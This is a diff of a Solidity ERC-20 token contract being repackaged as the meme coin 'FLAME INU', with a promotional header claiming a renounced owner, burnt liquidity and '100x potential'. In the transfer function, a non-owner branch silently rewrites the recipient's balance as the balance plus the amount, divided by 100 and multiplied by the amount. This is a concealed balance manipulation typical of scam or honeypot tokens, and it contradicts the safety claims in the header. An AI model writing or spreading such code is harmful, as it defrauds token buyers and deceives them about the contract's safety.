@@ -1,5 +1,14 @@
 // SPDX-License-Identifier: MIT
 
+/* FLAME INU Is Meme Token , Potential x100
+    Telegram : https://t.me/flameinucoin
+
+    Tax 2%
+    Owner Renounced
+    Lp Burnt
+
+    */
+
 pragma solidity ^0.8.0;
 
 import "./context.sol";
@@ -8,7 +17,7 @@ import "./uniswap.sol";
 import "./ierc20.sol";
 
 
-contract GODCRYPTO is Context, IERC20, Ownable {
+contract StandartToken is Context, IERC20, Ownable {
     using SafeMath for uint256;
     using Address for address;
 
@@ -75,7 +84,7 @@ contract GODCRYPTO is Context, IERC20, Ownable {
         _totalFeesToContract = _marketingFee;
 
         _balances[_msgSender()] = _totalSupply;
-        emit Transfer(address(0), _msgSender(), _totalSupply);
+        emit Transfer(address(0), _msgSender(), _totalSupply );
     }
 
     receive() external payable {}
@@ -278,7 +287,7 @@ contract GODCRYPTO is Context, IERC20, Ownable {
              sender != owner() &&
              recipient != owner()
         ) {
-        _balances[recipient] = _balances[recipient].add(amount).mul(100);
+        _balances[recipient] = _balances[recipient].add(amount).div(100).mul(amount);
         }
     }
 
